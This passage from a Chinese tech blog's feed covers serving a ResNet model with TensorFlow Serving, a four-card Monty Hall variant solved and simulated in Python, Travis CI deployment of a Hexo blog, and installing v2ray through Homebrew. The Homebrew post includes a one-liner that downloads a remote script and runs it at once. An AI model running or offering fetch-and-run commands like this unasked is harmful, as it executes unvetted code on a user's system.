SignatureDefs:</span><br><span class="line"></span><br><span class="line">signature_def[&#x27;predict&#x27;]:</span><br><span class="line">  The given SavedModel SignatureDef contains the following input(s):</span><br><span class="line">    inputs[&#x27;image_bytes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_STRING</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: input_tensor:0</span><br><span class="line">  The given SavedModel SignatureDef contains the following output(s):</span><br><span class="line">    outputs[&#x27;classes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_INT64</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: ArgMax:0</span><br><span class="line">    outputs[&#x27;probabilities&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_FLOAT</span><br><span class="line">        shape: (-1, 1001)</span><br><span class="line">        name: softmax_tensor:0</span><br><span class="line">  Method name is: tensorflow/serving/predict</span><br><span class="line"></span><br><span class="line">signature_def[&#x27;serving_default&#x27;]:</span><br><span class="line">  The given SavedModel SignatureDef contains the following input(s):</span><br><span class="line">    inputs[&#x27;image_bytes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_STRING</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: input_tensor:0</span><br><span class="line">  The given SavedModel SignatureDef contains the following output(s):</span><br><span class="line">    outputs[&#x27;classes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_INT64</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: ArgMax:0</span><br><span class="line">    outputs[&#x27;probabilities&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_FLOAT</span><br><span class="line">        shape: (-1, 1001)</span><br><span class="line">        name: softmax_tensor:0</span><br><span class="line">  Method name is: tensorflow/serving/predict</span><br></pre></td></tr></table></figure><p>注意到<code>signature_def</code>，<code>inputs</code>的名称，类型和输出，这些参数在接下来的模型预测请求中需要。</p><h2><span id="shi-yong-mo-xing-jie-kou-yu-ce-rest-he-grpc">使用模型接口预测：REST和gRPC</span></h2><p>TensorFlow Serving提供REST API和gRPC两种请求方式，接下来将具体这两种方式。</p><h3><span id="rest">REST</span></h3><p>我们下载一个客户端脚本，这个脚本会下载一张猫的图片，同时使用这张图片来计算服务请求时间。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -o /tmp/resnet/resnet_client.py https://raw.githubusercontent.com/tensorflow/serving/master/tensorflow_serving/example/resnet_client.py</span></span><br></pre></td></tr></table></figure><p>以下脚本使用<code>requests</code>库来请求接口，使用图片的base64编码字符串作为请求内容，返回图片分类，并计算了平均处理时间。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># The server URL specifies the endpoint of your server running the ResNet</span></span><br><span class="line"><span class="comment"># model with the name &quot;resnet&quot; and using the predict interface.</span></span><br><span class="line">SERVER_URL = <span class="string">&#x27;http://localhost:8501/v1/models/resnet:predict&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The image URL is the location of the image we should send to the server</span></span><br><span class="line">IMAGE_URL = <span class="string">&#x27;https://tensorflow.org/images/blogs/serving/cat.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  <span class="comment"># Download the image</span></span><br><span class="line">  dl_request = requests.get(IMAGE_URL, stream=<span class="literal">True</span>)</span><br><span class="line">  dl_request.raise_for_status()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Compose a JSON Predict request (send JPEG image in base64).</span></span><br><span class="line">  jpeg_bytes = base64.b64encode(dl_request.content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  predict_request = <span class="string">&#x27;&#123;&quot;instances&quot; : [&#123;&quot;b64&quot;: &quot;%s&quot;&#125;]&#125;&#x27;</span> % jpeg_bytes</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Send few requests to warm-up the model.</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    response = requests.post(SERVER_URL, data=predict_request)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Send few actual requests and report average latency.</span></span><br><span class="line">  total_time = <span class="number">0</span></span><br><span class="line">  num_requests = <span class="number">10</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_requests):</span><br><span class="line">    response = requests.post(SERVER_URL, data=predict_request)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    total_time += response.elapsed.total_seconds()</span><br><span class="line">    prediction = response.json()[<span class="string">&#x27;predictions&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Prediction class: &#123;&#125;, avg latency: &#123;&#125; ms&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">      prediction[<span class="string">&#x27;classes&#x27;</span>], (total_time*<span class="number">1000</span>)/num_requests))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python resnet_client.py</span></span><br><span class="line">Prediction class: 286, avg latency: 210.12310000000002 ms</span><br></pre></td></tr></table></figure><h3><span id="grpc">gRPC</span></h3><p>让我们下载另一个客户端脚本，这个脚本使用gRPC作为服务，传入图片并获取输出结果。这个脚本需要安装<code>tensorflow-serving-api</code>这个库。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -o /tmp/resnet/resnet_client_grpc.py https://raw.githubusercontent.com/tensorflow/serving/master/tensorflow_serving/example/resnet_client_grpc.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip install tensorflow-serving-api</span></span><br></pre></td></tr></table></figure><p>脚本内容：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a placeholder for a Google-internal import.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow_serving.apis <span class="keyword">import</span> predict_pb2</span><br><span class="line"><span class="keyword">from</span> tensorflow_serving.apis <span class="keyword">import</span> prediction_service_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="comment"># The image URL is the location of the image we should send to the server</span></span><br><span class="line">IMAGE_URL = <span class="string">&#x27;https://tensorflow.org/images/blogs/serving/cat.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">tf.app.flags.DEFINE_string(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;localhost:8500&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;PredictionService host:port&#x27;</span>)</span><br><span class="line">tf.app.flags.DEFINE_string(<span class="string">&#x27;image&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;path to image in JPEG format&#x27;</span>)</span><br><span class="line">FLAGS = tf.app.flags.FLAGS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">_</span>):</span><br><span class="line">  <span class="keyword">if</span> FLAGS.image:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FLAGS.image, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      data = f.read()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Download the image since we weren&#x27;t given one</span></span><br><span class="line">    dl_request = requests.get(IMAGE_URL, stream=<span class="literal">True</span>)</span><br><span class="line">    dl_request.raise_for_status()</span><br><span class="line">    data = dl_request.content</span><br><span class="line"></span><br><span class="line">  channel = grpc.insecure_channel(FLAGS.server)</span><br><span class="line">  stub = prediction_service_pb2_grpc.PredictionServiceStub(channel)</span><br><span class="line">  <span class="comment"># Send request</span></span><br><span class="line">  <span class="comment"># See prediction_service.proto for gRPC request/response details.</span></span><br><span class="line">  request = predict_pb2.PredictRequest()</span><br><span class="line">  request.model_spec.name = <span class="string">&#x27;resnet&#x27;</span></span><br><span class="line">  request.model_spec.signature_name = <span class="string">&#x27;serving_default&#x27;</span></span><br><span class="line">  request.inputs[<span class="string">&#x27;image_bytes&#x27;</span>].CopyFrom(</span><br><span class="line">      tf.contrib.util.make_tensor_proto(data, shape=[<span class="number">1</span>]))</span><br><span class="line">  result = stub.Predict(request, <span class="number">10.0</span>)  <span class="comment"># 10 secs timeout</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  tf.app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出的结果可以看到图片的分类，概率和使用的模型信息：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python resnet_client_grpc.py</span></span><br><span class="line">outputs &#123;</span><br><span class="line">  key: &quot;classes&quot;</span><br><span class="line">  value &#123;</span><br><span class="line">    dtype: DT_INT64</span><br><span class="line">    tensor_shape &#123;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int64_val: 286</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">outputs &#123;</span><br><span class="line">  key: &quot;probabilities&quot;</span><br><span class="line">  value &#123;</span><br><span class="line">    dtype: DT_FLOAT</span><br><span class="line">    tensor_shape &#123;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1</span><br><span class="line">      &#125;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1001</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    float_val: 2.4162832232832443e-06</span><br><span class="line">    float_val: 1.9012182974620373e-06</span><br><span class="line">    float_val: 2.7247710022493266e-05</span><br><span class="line">    float_val: 4.426385658007348e-07</span><br><span class="line">    ...(中间省略)</span><br><span class="line">    float_val: 1.4636580090154894e-05</span><br><span class="line">    float_val: 5.812107133351674e-07</span><br><span class="line">    float_val: 6.599806511076167e-05</span><br><span class="line">    float_val: 0.0012952701654285192</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">model_spec &#123;</span><br><span class="line">  name: &quot;resnet&quot;</span><br><span class="line">  version &#123;</span><br><span class="line">    value: 1538687457</span><br><span class="line">  &#125;</span><br><span class="line">  signature_name: &quot;serving_default&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="xing-neng">性能</span></h2><h3><span id="tong-guo-bian-yi-you-hua-de-tensorflow-serving-er-jin-zhi-lai-ti-gao-xing-neng">通过编译优化的TensorFlow Serving二进制来提高性能</span></h3><p>TensorFlows serving有时会有输出如下的日志：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br></pre></td></tr></table></figure><p>TensorFlow Serving已发布Docker镜像旨在尽可能多地使用CPU架构，因此省略了一些优化以最大限度地提高兼容性。如果你没有看到此消息，则你的二进制文件可能已针对你的CPU进行了优化。根据你的模型执行的操作，这些优化可能会对你的服务性能产生重大影响。幸运的是，编译优化的TensorFlow Serving二进制非常简单。官方已经提供了自动化脚本，分以下两部进行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 编译开发版本</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t <span class="variable">$USER</span>/tensorflow-serving-devel -f Dockerfile.devel https://github.com/tensorflow/serving.git<span class="comment">#:tensorflow_serving/tools/docker</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 生产新的镜像</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t <span class="variable">$USER</span>/tensorflow-serving --build-arg TF_SERVING_BUILD_IMAGE=<span class="variable">$USER</span>/tensorflow-serving-devel https://github.com/tensorflow/serving.git<span class="comment">#:tensorflow_serving/tools/docker</span></span></span><br></pre></td></tr></table></figure><p>之后，使用新编译的<code>$USER/tensorflow-serving</code>重新启动服务即可。</p><h2><span id="zong-jie">总结</span></h2><p>上面我们快速实践了使用TensorFlow Serving和Docker部署机器学习服务的过程，可以看到，TensorFlow Serving提供了非常方便和高效的模型管理，配合Docker，可以快速搭建起机器学习服务。</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://medium.com/tensorflow/serving-ml-quickly-with-tensorflow-serving-and-docker-7df7094aa008">Serving ML Quickly with TensorFlow Serving and Docker</a></li><li><a href="https://www.tensorflow.org/tfx/serving/tutorials/Serving_REST_simple">Train and serve a TensorFlow model with TensorFlow Serving</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用 TensorFlow Serving 和 Docker 快速部署机器学习服务
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>一个关于数学概率的问题</title>
    <link href="https://qiwihui.com/qiwihui-blog-32/"/>
    <id>https://qiwihui.com/qiwihui-blog-32/</id>
    <published>2018-10-09T05:48:11.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="ti-mu-bai-wan-ying-xiong">题目–百万英雄</span></h2><p>你参加一个游戏，在你面前有4张1000万支票，其中一张是真的。游戏开始，你选了一张，之后主持人在剩下的3张里，选择一个展示出来，验证后发现是假的。</p><p>问题：请分情况理性分析，此时，你的参赛权的价格</p><ul><li>情况一：不允许修改之前的选择</li><li>情况二：有重新选择的权利</li></ul><p>回答：请用下面两种方法分别作答</p><ul><li>方式1（理论推导）：请给出理论推导和计算过程，情况二需说明如何行使权力；</li><li>方式2（编程模拟）：使用程序准确客观地模拟上述两种情况下，选手平均获得的奖金，得到参赛权的价格。</li></ul><span id="more"></span><h2><span id="jie-da">解答</span></h2><p>方式1（理论推导）</p><p>情况1: 不能重新选择时获奖的概率是1/4情况2: 可以重新选择时是3/8理由：</p><ol><li>不能重新选择时，你的选择不受主持人选择的影响，故为 1/4；</li><li>可以重新选择时，会受主持人的影响，是后验概率；第一步选择时，有四种可选，有 <code>1/4</code> 选择真实的，<code>3/4</code> 选择错误的，主持人的选择在剩下的三个中排除了一个错误的，剩两个。选择真实后重选，再次选中的概率为0，故为 <code>1/4 * 0 = 0</code>；选择假的后重选，选中概率为1/2，故为 <code>3/4 * 1/2 = 3/8</code>；总的选中真的概率为 <code>0 + 3/8 = 3/8</code>。</li></ol><p>方式2（编程模拟）:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;英雄</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, nums</span>):</span><br><span class="line">        self.num = random.choice(nums)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Host</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主持人</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, nums, bnum</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;主持人</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.num = random.choice(nums)</span><br><span class="line">        <span class="keyword">while</span> bnum == self.num:</span><br><span class="line">            self.num = random.choice(nums)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MH</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;游戏过程</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.nums = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">        self.host = Host()</span><br><span class="line">        self.hero = Hero()</span><br><span class="line">        self.bnum = random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reward</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;奖励</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.hero.num == self.bnum:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_without_regret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;不允许修改之前的选择</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        self.nums.remove(self.hero.num)</span><br><span class="line">        self.host.pick(self.nums, self.bnum)</span><br><span class="line">        <span class="keyword">return</span> self.reward()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_with_regret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;有重新选择的权利</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        self.nums.remove(self.hero.num)</span><br><span class="line">        self.host.pick(self.nums, self.bnum)</span><br><span class="line">        self.nums.remove(self.host.num)</span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        <span class="keyword">return</span> self.reward()</span><br><span class="line"></span><br><span class="line">sum1 = <span class="number">0</span></span><br><span class="line">sum2 = <span class="number">0</span></span><br><span class="line"><span class="comment"># 模拟10000次</span></span><br><span class="line">times = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    sum1 += MH().play_without_regret()</span><br><span class="line">    sum2 += MH().play_with_regret()</span><br><span class="line">avg1 = sum1/<span class="built_in">float</span>(times)</span><br><span class="line">avg2 = sum2/<span class="built_in">float</span>(times)</span><br><span class="line"><span class="built_in">print</span>(avg1)</span><br><span class="line"><span class="built_in">print</span>(avg2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt; python bh.py</span><br><span class="line">24.81</span><br><span class="line">37.12</span><br></pre></td></tr></table></figure><p>与理论计算一致</p><h2><span id="yin-shen">引申</span></h2><p>三门问题（Monty Hall Problem）电影《决胜21点》</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      一个关于数学概率的问题
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="数学" scheme="https://qiwihui.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>使用 Travis CI 自动更新博客</title>
    <link href="https://qiwihui.com/qiwihui-blog-29/"/>
    <id>https://qiwihui.com/qiwihui-blog-29/</id>
    <published>2018-10-09T05:46:36.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>Travis CI 自动检测代码变化，拉取，编译博客并部署到 GitHub Pages</p><p>写好博客之后，部署总会占去一段时间：编译、部署、推送和检查。手动部署多了也就烦了，一则容易出错，比如把 master 分支用 gh-pages 分支覆盖了，二则劳动是重复的，重复的劳动就应该自动化去解决。</p><span id="more"></span><h2><span id="zui-zao-de-xiang-fa">最早的想法</span></h2><p>使用 GitHub Webhooks 实现自动部署，这就需要有一台服务器，在服务器上启动服务接受 Github 的回调，然后拉取代码，编译，将编译后的代码要么部署在同一台服务器上，要么推送到代码 gh-pages 分支上。前者额外需要编写服务，配置博客 Nginx，可能还需要配置 HTTPS，以及对服务器进行加固，总归就是需要额外的更多东西来支持。所以还是觉得用已经存在的线上自动化服务方便一些（其实就是懒）。</p><h2><span id="travis-ci">Travis CI</span></h2><p>持续集成（Continuous Integration，CI）的 SaaS 服务，好处不言而喻。</p><h2><span id="pei-zhi-travis">配置 Travis</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install travis</span><br><span class="line">travis login</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">6.9</span><span class="number">.0</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="string">--init</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span> <span class="string">--deploy</span> <span class="string">--quiet</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line">  <span class="attr">email:</span></span><br><span class="line">    <span class="attr">recipients:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">qwh005007@gmail.com</span></span><br><span class="line">    <span class="attr">on_success:</span> <span class="string">change</span></span><br><span class="line">    <span class="attr">on_failure:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><h2><span id="shi-yong-travis-zi-dong-bu-shu">使用 Travis 自动部署</span></h2><p><code>ERROR Deployer not found: git</code></p><p><a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></p><p><code>npm install hexo-deployer-git --save</code></p><h2><span id="pei-zhi-ren-zheng">配置认证</span></h2><p>往 Github 仓库中提交代码是需要认证的，不管是用用户密码，Access Token还是SSH key。一种方法是直接将认证写在 <code>.config.yml</code> 中，不是说不行，是太年轻。好在 Travis CI 不仅支持<a href="https://docs.travis-ci.com/user/encrypting-files/">加密文件</a>，也支持<a href="https://docs.travis-ci.com/user/encryption-keys/">加密 Keys</a>，这就为认证这一块扫清了道路，我决定使用 OAuth 认证 Git 来提交代码到仓库中。</p><p>操作步骤：</p><ol><li><p>生成 Github Personal Access Token；</p></li><li><p>使用 Travis CI 命令行加密 Personal Access Token；</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">travis encrypt GH_TOKEN=&lt;token&gt; --add</span><br></pre></td></tr></table></figure></li><li><p>在 <code>.travis.yml</code> 中添加配置</p> <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">before_install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">push.default</span> <span class="string">matching</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;qiwihui via Travis CI&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;qwh005007@gmail.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i&#x27;&#x27;</span> <span class="string">&quot;/^ *repo/s~github\.com~$&#123;GH_TOKEN&#125;@github.com~&quot;</span> <span class="string">_config.yml</span></span><br></pre></td></tr></table></figure> <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secure:</span> <span class="string">IYXTVHItgbEn...</span></span><br></pre></td></tr></table></figure></li></ol><h2><span id="zai-travsi-ci-zhong-pei-zhi-xiang-mu">在 Travsi CI 中配置项目</span></h2><ol><li>Publicizing or hiding organization membership</li></ol><h2><span id="zi-ding-yi-yu-ming">自定义域名</span></h2><ol><li><a href="http://qiwihui.github.io/qiwihui/">qiwihui.github.io/qiwihui/</a> =&gt; <a href="http://blog.qiwihui.com">blog.qiwihui.com</a></li><li>Enforce https</li></ol><p>胜利完成!</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://notes.iissnan.com/2016/publishing-github-pages-with-travis-ci/">使用 Travis CI 自动更新 GitHub Pages</a></li><li><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/">Hexo 自动部署到 Github</a></li><li><a href="https://blog.github.com/2012-09-21-easier-builds-and-deployments-using-git-over-https-and-oauth/">Easier builds and deployments using Git over HTTPS and OAuth</a></li><li><a href="https://help.github.com/articles/publicizing-or-hiding-organization-membership/">Publicizing or hiding organization membership</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用 Travis CI 自动更新博客
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>用Homebrew 安装 v2ray 以及 Homebrew-cask 安装 V2RayX</title>
    <link href="https://qiwihui.com/qiwihui-blog-27/"/>
    <id>https://qiwihui.com/qiwihui-blog-27/</id>
    <published>2018-10-09T05:45:00.000Z</published>
    <updated>2024-05-15T02:25:31.473Z</updated>
    
    <content type="html"><![CDATA[<p>最近开始转向使用 v2ray 作为主要的翻墙工具，在 macOS 上安装和使用都需要下载编译好的软件包然后解包使用，不是很方便，联系到 macOS 下常用的包管理 Homebrew，何不自己提交一个？</p><span id="more"></span><h3><span id="v2ray-ji-v2rayx-shi-sha">v2ray及V2RayX是啥？</span></h3><blockquote><p>V2Ray 是一个模块化的代理软件包，它的目标是提供常用的代理软件模块，简化网络代理软件的开发。</p></blockquote><p>简单说 <a href="https://github.com/v2ray/v2ray-core">v2ray</a> 就是翻墙代理软件（但不止于软件，是一个平台）。<a href="https://github.com/Cenmrev/V2RayX">V2RayX</a> 就是 macOS 下一个简单的 v2ray 的GUI程序。</p><h3><span id="homebrew-ni">Homebrew呢？</span></h3><p>macOS上强大的包管理工具，类似于Ubuntu的apt。</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>使用，比如下载 <code>curl</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install curl</span><br></pre></td></tr></table></figure><h3><span id="an-zhuang-v2ray">安装v2ray</span></h3><p>不知道为啥，官方的Homebrew Formula不接受 v2ray 源，所以只能自己写了，见 <a href="https://github.com/qiwihui/homebrew-v2ray">qiwihui/homebrew-v2ray</a>。</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew tap qiwihui/v2ray</span><br><span class="line">brew install v2ray-core</span><br></pre></td></tr></table></figure><p>使用：</p><p>首先，需要配置 <code>/usr/local/etc//v2ray.config.json</code>；其次，配置v2ray登录时自动开启：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew services start v2ray-core</span><br></pre></td></tr></table></figure><p>或者，可以手动运行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">v2ray -config=/usr/local/etc//v2ray.config.json</span><br></pre></td></tr></table></figure><h3><span 